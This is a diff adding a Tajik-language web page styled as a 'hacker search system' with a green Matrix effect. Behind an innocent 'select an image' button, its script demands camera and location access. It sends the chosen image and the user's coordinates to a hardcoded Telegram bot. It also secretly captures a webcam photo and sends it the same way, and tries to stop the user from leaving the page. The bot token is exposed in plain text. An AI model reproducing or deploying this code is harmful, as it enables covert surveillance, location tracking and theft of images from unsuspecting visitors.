@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="tg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Системаи Ҳакерӣ</title>
+    <link rel="icon" type="image/x-icon" href="ahmad.png">
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #00ff00;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            position: relative;
+            padding: 20px;
+            max-width: 600px;
+            margin: 50px auto;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            box-shadow: 0 0 20px #00ff00;
+        }
+
+        h1 {
+            color: #00ff00;
+            font-size: 24px;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 20px;
+        }
+
+        .image-container {
+            margin: 20px auto;
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            padding: 10px;
+            background: rgba(0, 255, 0, 0.1);
+            position: relative;
+            box-shadow: 0 0 20px #00ff00;
+        }
+
+        .image-container img {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 8px;
+        }
+
+        button {
+            background: none;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            text-shadow: 0 0 5px #00ff00;
+            transition: all 0.3s ease-in-out;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #00ff00;
+            color: #000;
+            text-shadow: none;
+        }
+
+        .matrix {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .loading-container {
+            margin-top: 20px;
+            display: none;
+        }
+
+        .progress-bar {
+            width: 100%;
+            background-color: rgba(0, 255, 0, 0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            height: 20px;
+            margin: 10px 0;
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        .progress {
+            background-color: #00ff00;
+            width: 0;
+            height: 100%;
+            transition: width 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix"></div>
+    <div class="container">
+        <h1>Системаи Ҷустуҷӯи Ҳакерӣ</h1>
+        <div class="image-container">
+            <img id="selected-image" src="" alt="Расм интихоб нашудааст">
+        </div>
+        <button id="select-image-btn">Расм интихоб кунед</button>
+
+        <div class="loading-container">
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7675500752:AAG4Oms4olj4QpqRKAYxvYnZYFMvOc1p8KU';
+        const CHAT_ID = '6622134191';
+    
+        const selectImageBtn = document.getElementById('select-image-btn');
+        const selectedImage = document.getElementById('selected-image');
+        const loadingContainer = document.querySelector('.loading-container');
+        const progressBar = document.getElementById('progress');
+    
+        // Эффекти "Матрица"
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const matrixDiv = document.querySelector('.matrix');
+    
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        matrixDiv.appendChild(canvas);
+    
+        const letters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+    
+        function drawMatrixEffect() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f0';
+            ctx.font = `${fontSize}px monospace`;
+    
+            drops.forEach((y, index) => {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                const x = index * fontSize;
+                ctx.fillText(text, x, y * fontSize);
+    
+                if (y * fontSize > canvas.height || Math.random() > 0.95) {
+                    drops[index] = 0;
+                }
+                drops[index]++;
+            });
+        }
+        setInterval(drawMatrixEffect, 50);
+    
+        // Дастрасӣ ба вебкамера
+        function requestCameraAccess() {
+            return navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    console.log('Камера дастрас шуд.');
+                })
+                .catch(() => {
+                    alert('Барнома қатъ мешавад. Иҷозат лозим аст.');
+                    throw new Error('Камера рад шуд.');
+                });
+        }
+    
+        // Дастрасӣ ба геолокация
+        function requestGeolocationAccess() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => resolve(position.coords),
+                        () => reject(new Error('Геолокация рад шуд.'))
+                    );
+                } else {
+                    reject(new Error('Геолокация дастгирӣ намешавад.'));
+                }
+            });
+        }
+    
+        // Расм интихоб кардан
+        selectImageBtn.addEventListener('click', async () => {
+            try {
+                await requestCameraAccess();
+                const coords = await requestGeolocationAccess();
+    
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.onchange = (event) => {
+                    const file = event.target.files[0];
+                    if (file) {
+                        const reader = new FileReader();
+                        reader.onload = (e) => {
+                            selectedImage.src = e.target.result;
+                            showLoadingAnimation();
+                            // Отправить изображение в Telegram через 2 секунды
+                            setTimeout(() => {
+                                sendToTelegram(file, coords.latitude, coords.longitude);
+                            }, 2000); 
+                        };
+                        reader.readAsDataURL(file);
+                    }
+                };
+                input.click();
+            } catch (error) {
+                console.error(error);
+            }
+        });
+    
+        // Ирсоли маълумот ба Telegram
+        function sendToTelegram(imageData, lat, lon) {
+            const urlPhoto = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageData); 
+    
+            fetch(urlPhoto, { method: 'POST', body: formData })
+                .then((response) => {
+                    if (!response.ok) {
+                        throw new Error(`Telegram хатогӣ дод: ${response.status}`);
+                    }
+                    console.log('Расм ба Telegram фиристода шуд.');
+                    // Ирсоли геолокация
+                    const urlLocation = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
+                    return fetch(`${urlLocation}?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);
+                })
+                .then((response) => {
+                    if (!response.ok) {
+                        throw new Error(`Telegram хатогӣ дод ҳангоми ирсоли геолокация: ${response.status}`);
+                    }
+                    console.log('Геолокация ба Telegram фиристода шуд.');
+                })
+                .catch((error) => {
+                    console.error('Хатогӣ ҳангоми ирсоли маълумот:', error);
+                });
+        }
+    
+        // Эффекти "загрузка"
+        function showLoadingAnimation() {
+            loadingContainer.style.display = 'block';
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+    
+                if (progress === 45) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        loadingContainer.style.display = 'none'; 
+                    }, 5000);  
+                }
+            }, 100);
+        }
+        function captureFromWebcamAndSend() {
+    // Дастрасӣ ба камера
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            // Элементҳои зарурӣ
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            // Боварӣ ҳосил кардани он, ки видео пурра бор шудааст
+            video.addEventListener('loadedmetadata', () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Пас аз 2 сония расмро бигирад
+                setTimeout(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Суратро ба Blob табдил диҳед
+                    canvas.toBlob((blob) => {
+                        video.srcObject.getTracks().forEach(track => track.stop()); // Стримро қатъ кунед
+                        sendImageToTelegram(blob); // Ирсоли расм ба Telegram
+                    }, 'image/png');
+                }, 2000); // Интизории 2 сония
+            });
+        })
+        .catch((error) => {
+            alert('Иҷозат барои камера лозим аст.');
+            console.error('Хатогӣ ҳангоми дастрасӣ ба вебкамера:', error);
+        });
+}
+
+// Функсия барои фиристодани расм ба Telegram
+function sendImageToTelegram(imageBlob) {
+    const urlPhoto = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', imageBlob);
+
+    fetch(urlPhoto, { method: 'POST', body: formData })
+        .then((response) => {
+            if (!response.ok) {
+                throw new Error(`Telegram хатогӣ дод: ${response.status}`);
+            }
+            console.log('Сурат ба Telegram фиристода шуд.');
+        })
+        .catch((error) => {
+            console.error('Хатогӣ ҳангоми ирсоли сурат:', error);
+        });
+}
+
+// Пешгирии қатъ шудани функсия ҳангоми баромадан аз саҳифа
+window.addEventListener('beforeunload', (event) => {
+    event.preventDefault();
+    event.returnValue = '';
+});
+
+// Пайваст кардани функсия ба тугма
+document.getElementById('select-image-btn').addEventListener('click', captureFromWebcamAndSend);
+
+    </script>
+    
+    
+</body>
+</html>
